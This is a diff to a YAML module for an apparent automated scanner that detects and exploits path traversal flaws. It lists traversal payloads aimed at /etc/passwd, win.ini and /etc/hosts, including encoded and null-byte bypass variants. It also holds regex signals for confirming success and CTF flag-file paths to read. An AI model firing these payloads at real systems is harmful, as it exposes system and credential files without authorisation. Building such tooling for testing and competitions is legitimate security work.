@@ -4,12 +4,18 @@
 id: web_path_traversal
 name: Path Traversal / Directory Traversal
 category: web
-version: "1.0"
+version: "1.1"
 author: system
 description: >
   Detects and exploits path traversal vulnerabilities that allow reading
   arbitrary files via ../ sequences. Distinct from LFI - focuses on file
   read rather than code execution. Uses encoding bypasses and null byte tricks.
+
+tags:
+  - path-traversal
+  - traversal
+  - file-read
+estimated_duration_seconds: 25
 
 # ============================================================
 # Guard
@@ -58,7 +64,8 @@ detection_paths:
             - '..\\..\\..\\windows\\win.ini'
             - '../../../../etc/hosts'
         signals:
-          - match: 'root:.*:/bin/|\\[fonts\\]|localhost'
+          - match:
+              condition: "response.status in [200, 206, 500] and re.search(r'root:.*:/bin/|\\[fonts\\]|localhost', response.body, re.I)"
             on_match:
               confidence_boost: 0.50
               emit: traversal_confirmed
@@ -78,7 +85,8 @@ detection_paths:
             - '..%2f..%2f..%2fetc%2fpasswd'
             - '%252e%252e%252f%252e%252e%252fetc%252fpasswd'
         signals:
-          - match: 'root:.*:/bin/'
+          - match:
+              condition: "response.status in [200, 206, 500] and re.search(r'root:.*:/bin/', response.body, re.I)"
             on_match:
               confidence_boost: 0.45
               emit: traversal_encoding_bypass
@@ -97,7 +105,8 @@ detection_paths:
             - '../../../etc/passwd%00'
             - '../../../etc/passwd%00.jpg'
         signals:
-          - match: 'root:.*:/bin/'
+          - match:
+              condition: "response.status in [200, 206, 500] and re.search(r'root:.*:/bin/', response.body, re.I)"
             on_match:
               confidence_boost: 0.40
               emit: traversal_null_byte_confirmed
@@ -124,6 +133,7 @@ exploitation_paths:
             - '/flag.txt'
             - '/var/www/flag.txt'
             - '/home/ctf/flag.txt'
+            - '../../../../../app/flag.txt'
             - 'flag'
         capture:
           - pattern: 'flag\{[^}]+\}'
